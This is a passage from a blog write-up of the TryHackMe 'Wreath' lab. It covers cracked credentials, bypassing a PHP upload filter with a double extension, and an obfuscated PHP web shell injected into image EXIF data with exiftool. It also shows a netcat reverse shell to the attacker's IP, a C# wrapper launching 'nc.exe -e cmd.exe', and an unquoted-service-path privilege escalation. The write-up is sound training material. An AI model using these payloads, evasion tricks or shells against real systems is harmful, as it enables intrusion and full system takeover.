canâ€™t access the resources without valid credentials. This is where the hash for Thomas obtained from mimikatz came in handy. I was able to guess the password using hashcat.</p><p>Logging in with thomas : I&lt;3ruby is a success and I get access to the resource.</p><p><img data-src="//assets/img/wreath-writeup/resources-index2.png" alt="alt-35" data-proofer-ignore></p><h3 id="filter-bypass"><span class="mr-2">Filter Bypass</span><a href="#filter-bypass" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>The purpose of bypassing these checks it so I can upload a malicious php file even though the program expects an image.</p><p>Assessing the source code reveals a few things of note. The parameter being used here is â€˜<strong>file</strong>â€™. When a file is uploaded, there is a check for whether the file extension exists in a list of valid extensions. There is another check for whether the variable $size contains False.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>$size =
getimagesize($_FILES["file"]["tmp_name"]);
if(!in_array(explode(".",
$_FILES["file"]["name"])[1], $goodExts) || !$size){
header("location: ./?msg=Fail");
</pre></table></code></div></div><p>The first check for valid extensions has a vulnerability. They are only checking if the extension at index 1 is valid, any extensions thereafter can be whatever I want.</p><p>The program splits the strings of the filename into a list around the period â€˜.â€™</p><p>Example:</p><p>Filename.jpg â€“&gt; [â€˜Filenameâ€™,â€™jpgâ€™]</p><p>Then it checks if the item at index 1 is valid by comparing it to a list of valid extensions. By appending a php extension to the end of the filename, we can upload a php file that passes as an image file.</p><p>Example:</p><p>Filename.jpg.php â€“&gt; [â€˜Filenameâ€™,â€™jpgâ€™,â€™phpâ€™]</p><p>The item at index 1 is still valid and the php extension specifies we have php for the server to execute. The server will ignore the image data when it comes time to execute the file and will find the payload as valid php!</p><p>The second check uses the â€˜getimagesizeâ€™ function to determine if there are valid dimensions encoded in the exifdata. This can be bypassed by simply using a legitimate image.</p><p>Another important piece is where the files are stored once theyâ€™ve been successfully uploaded. The $target variable indicates it will be the â€˜uploads/â€™ directory.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>$target = "uploads/".basename($_FILES["file"]["name"]);
...
move_uploaded_file($_FILES["file"]["tmp_name"], $target);
</pre></table></code></div></div><h3 id="proof-of-concept"><span class="mr-2">Proof-of-Concept</span><a href="#proof-of-concept" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>To ensure the encoded dimensions are valid, it will be best to use a legitimate photo for the payload, append â€˜.phpâ€™ extension after the photo extension, and then inject a malicious comment into the images exif data to test if the php will run.</p><p>The filename will look something like cat-L15t3Nr.jpg.php</p><p><img data-src="//assets/img/wreath-writeup/cat.jpeg" alt="alt-36" data-proofer-ignore></p><p>The payload:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>&lt;?php
  $cmd = $_GET["wreath"];
  if(isset($cmd)){
    echo "&lt;pre&gt;" . shell_exec($cmd) . "&lt;/pre&gt;";
  }
  die();
?&gt;
</pre></table></code></div></div><p>This payload creates a parameter to inject commands into the underlying host machine, which is a PC. The commands are executed by the shell_exec() function. It is known that this machine will have an Anti-Virus, so to be slightly less obvious I will obfuscate the payload.</p><p>The obfuscated payload:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>&lt;?php $k0=$\_GET\[base64_decode('d3JlYXRo')\];if(isset($k0)){echo base64_decode('PHByZT4=').shell_exec($k0).base64_decode('PC9wcmU+');}die();?&gt;
</pre></table></code></div></div><p>Now, to inject this payload into an image file:</p><p><code class="language-plaintext highlighter-rouge">exiftool -Comment="\&lt;?php \\$k0=\\$\_GET [base64_decode('d3JlYXRo')\];if(isset(\\$k0)){echo base64_decode('PHByZT4=').shell_exec(\\$k0).base64_decode('PC9wcmU+');}die();?\&gt;" cat-L15t3Nr.jpg.php -v</code></p><p>The image file looks the same, except now there is a malicious comment in the meta data that will run when its executed.</p><p><img data-src="//assets/img/wreath-writeup/meta-data.png" alt="alt-37" data-proofer-ignore></p><p>Now, itâ€™s time to upload the malicious image file. The file uploads successfully.</p><p>After navigating to the uploaded file at http://10.200.81.100/resources/uploads/cat-L15t3Nr.jpg.php?wreath=systeminfo</p><p>I get the following response:</p><p><img data-src="//assets/img/wreath-writeup/PoC.png" alt="alt-38" data-proofer-ignore></p><p>Which proves the exploit is a success! Now for a reverse shell.</p><h3 id="reverse-shell"><span class="mr-2">Reverse Shell</span><a href="#reverse-shell" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>I want to upload a static binary of netcat that is compiled for windows systems. In order to do that, Iâ€™ll need to curl the binary from my local machine to the remote machine by spinning up a simple python server. Once I have netcat on the machine, I can trigger a connection to my machine to get a reverse shell.</p><p>I first created a new directory for myself in the temp directory. Then I uploaded the netcat binary and outputted it to my directory. Then I checked the directory to make sure it uploaded.</p><p><img data-src="//assets/img/wreath-writeup/nc-upload.png" alt="alt-39" data-proofer-ignore></p><p><img data-src="//assets/img/wreath-writeup/nc-upload-proof.png" alt="alt-40" data-proofer-ignore></p><p><img data-src="//assets/img/wreath-writeup/l15t3nr-directory-check.png" alt="alt-41" data-proofer-ignore></p><p>With netcat uploaded, I can use it to connect back to my local machine for a reverse shell.</p><p>Iâ€™ll first start a netcat listener on my local machine. Then Iâ€™ll send the following in the wreath parameter:</p><p><code class="language-plaintext highlighter-rouge">powershell.exe c:\\\Windows\\\Temp\\\L15t3Nr\\\nc.exe 10.50.82.91 1337 â€“e cmd.exe</code></p><p><img data-src="//assets/img/wreath-writeup/reverseshell-1.png" alt="alt-42" data-proofer-ignore></p><p>The command was successful, and I got a reverse shell!</p><p><img data-src="//assets/img/wreath-writeup/reverseshell-2.png" alt="alt-43" data-proofer-ignore></p><h3 id="post-enumeration-2"><span class="mr-2">Post-Enumeration</span><a href="#post-enumeration-2" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>Iâ€™m currently authenticated as Thomas, which simply will not do as Thomas does not have <strong>all</strong> the permissions.</p><p>A few commands Iâ€™ve run include:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>whoami /groups
whoami /priv
</pre></table></code></div></div><p>The â€˜SeImpersonatePrivilegeâ€™ sounds interesting. It allows me to â€œimpersonate a client after authenticationâ€</p><p><img data-src="//assets/img/wreath-writeup/groups-priv.png" alt="alt-44" data-proofer-ignore></p><p>Iâ€™ll also look at the Windows services and hopefully find something user installed.</p><p>Non-default services check:</p><p><code class="language-plaintext highlighter-rouge">wmic service get name,displayname,pathname,startmode | findstr /v /i â€œC:\Windowsâ€</code></p><p><img data-src="//assets/img/wreath-writeup/windows-services.png" alt="alt-45" data-proofer-ignore></p><p>There is a vulnerability known as an â€œUnquoted Service Pathâ€ attack, which could lead to a privilege escalation given that the path contains spaces, are writable, and running as NT AUTHORITY\SYSTEM.</p><p>The service that stands out is the System Explorer Service, since its path does not have quotes around it, and it contains spaces. If this service is running as NT AUTHORITY\SYSTEM and the directory is writable, then it might give privilege escalation.</p><p>To check who the service is running as:</p><p><code class="language-plaintext highlighter-rouge">sc qc SystemExplorerHelpService</code></p><p>The service is running as local system.</p><p><img data-src="//assets/img/wreath-writeup/service-running.png" alt="alt-46" data-proofer-ignore></p><p>Now to check if the directory is writable.</p><p><code class="language-plaintext highlighter-rouge">powershell â€œget-acl â€“Path â€˜C:\Program Files (x86)\System Explorerâ€™ | format-listâ€</code></p><p><img data-src="//assets/img/wreath-writeup/Writable-directory.png" alt="alt-47" data-proofer-ignore></p><p>The access is given to those in the Users group, so I can write to this path!</p><h3 id="privilege-escalation"><span class="mr-2">Privilege Escalation</span><a href="#privilege-escalation" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>A wrapper.cs program will be created to execute netcat.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre>using System;Â 

using System.Diagnostics;Â 

namespace Wrapper{Â 

Â Â Â  class Program{Â 

Â Â Â Â Â Â Â  Static void Main(){Â 

Â Â Â Â Â Â Â Â Â Â Â  Process proc = new Process();Â 

Â Â Â Â Â Â Â Â Â Â Â  ProcessStartInfo procInfo = new ProcessStartInfo(â€œC:\\Windows\\temp\\L15t3nr\\nc.exeâ€, â€œ10.50.82.91 443 -e cmd.exeâ€);Â Â 

Â Â Â Â Â Â Â Â Â Â Â  procInfo.CreateNoWindow = true;Â 

Â Â Â Â Â Â Â Â Â Â Â  proc.StartInfo = procInfo;Â 

Â Â Â Â Â Â Â Â Â Â Â  proc.Start();Â Â Â Â Â Â 

Â Â Â Â Â Â Â  }Â 

Â Â Â  }Â 

}
</pre></table></code></div></div><p>Then the wrapper.cs file is compiled with mcs:</p><p><code class="language-plaintext highlighter-rouge">msc Wrapper.cs</code></p><p><img data-src="//assets/img/wreath-writeup/Get-Wrapper.png" alt="alt-48" data-proofer-ignore></p><p>A writable directory is located at C:\Program Files (x86)\System Explorer\ and my wrapper program will be named System.exe in this directory to be executed when the service restarts.</p><p>With the System.exe file in place, and a netcat listening, the service can be restarted with:</p><p><code class="language-plaintext highlighter-rouge">sc stop SystemExplorerHelpService</code></p><p>And then</p><p><code class="language-plaintext highlighter-rouge">sc start SystemExplorerHelpService</code></p><p><img data-src="//assets/img/wreath-writeup/PrivilegeEscalation.png" alt="alt-49" data-proofer-ignore></p><p><img data-src="//assets/img/wreath-writeup/AllThePrivs.png" alt="alt-50" data-proofer-ignore></p><p>Now I have obtained all the privileges on all the machines ğŸ˜Š</p><h2 id="closing"><span class="mr-2">Closing</span><a href="#closing" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Doing this network and write-up has been very beneficial to my learning. The write-up especially has solidified the information from this network. This is an incredible TryHackMe network created by MuirlandOracle. Feel free to reach out! @L15t3Nr</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='//categories/tryhackme/'>TryHackMe</a>, <a href='//categories/writeup/'>WriteUp</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="//tags/tryhackme/" class="post-tag no-text-decoration" >TryHackMe</a> <a href="//tags/writeup/" class="post-tag no-text-decoration" >WriteUp</a> <a href="//tags/wreath/" class="post-tag no-text-decoration" >Wreath</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Wreath+Network+-+L15t3Nr&url=https%3A%2F%2Fl15t3nr.github.io%2Fposts%2FWreath-Network-Write-up%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Wreath+Network+-+L15t3Nr&u=https%3A%2F%2Fl15t3nr.github.io%2Fposts%2FWreath-Network-Write-up%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fl15t3nr.github.io%2Fposts%2FWreath-Network-Write-up%2F&text=Wreath+Network+-+L15t3Nr" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/FAT32-Access-Time/">Sunday Funday # 814 - FAT32 Access Time</a><li><a href="/posts/Corrupted-Image/">Manual Recovery of Location Data From JPG</a><li><a href="/posts/Wreath-Network-Write-up/">Wreath Network</a><li><a href="/posts/Olympus/">Olympus</a><li><a href="/posts/Napping/">Napping</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/writeup/">WriteUp</a> <a class="post-tag" href="/tags/tryhackme/">TryHackMe</a> <a class="post-tag" href="/tags/napping/">Napping</a> <a class="post-tag" href="/tags/olympus/">Olympus</a> <a class="post-tag" href="/tags/wonderland/">Wonderland</a> <a class="post-tag" href="/tags/wreath/">Wreath</a></div></div></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Olympus/"><div class="card-body"> <em class="small" data-ts="1658163600" data-df="ll" > Jul 18, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Olympus</h3><div class="text-muted small"><p> Olympus can be found here Enumeration The first step is to scan the target with nmap to discover running services. nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 22/tcp open ssh syn-ack Open...</p></div></div></a></div><div class="card"> <a href="/posts/Napping/"><div class="card-body"> <em class="small" data-ts="1658509200" data-df="ll" > Jul 22, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Napping</h3><div class="text-muted small"><p> Napping can be found here Nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux...</p></div></div></a></div><div class="card"> <a href="/posts/Wonderland/"><div class="card-body"> <em class="small" data-ts="1658595600" data-df="ll" > Jul 23, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Wonderland</h3><div class="text-muted small"><p> Wonderland can be found here Enumeration Nmap The results of nmap 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack OpenSSH 7.6p1 Ubuntu 4ubun...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"><div class="btn btn-outline-primary disabled" prompt="Older"><p>-</p></div><a href="//posts/Olympus/" class="btn btn-outline-primary" prompt="Newer"><p>Olympus</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> Â© 2025 <a href="https://infosec.exchange/@L15t3Nr">L15t3Nr</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/writeup/">WriteUp</a> <a class="post-tag" href="/tags/tryhackme/">TryHackMe</a> <a class="post-tag" href="/tags/napping/">Napping</a> <a class="post-tag" href="/tags/olympus/">Olympus</a> <a class="post-tag" href="/tags/wonderland/">Wonderland</a> <a class="post-tag" href="/tags/wreath/">Wreath</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
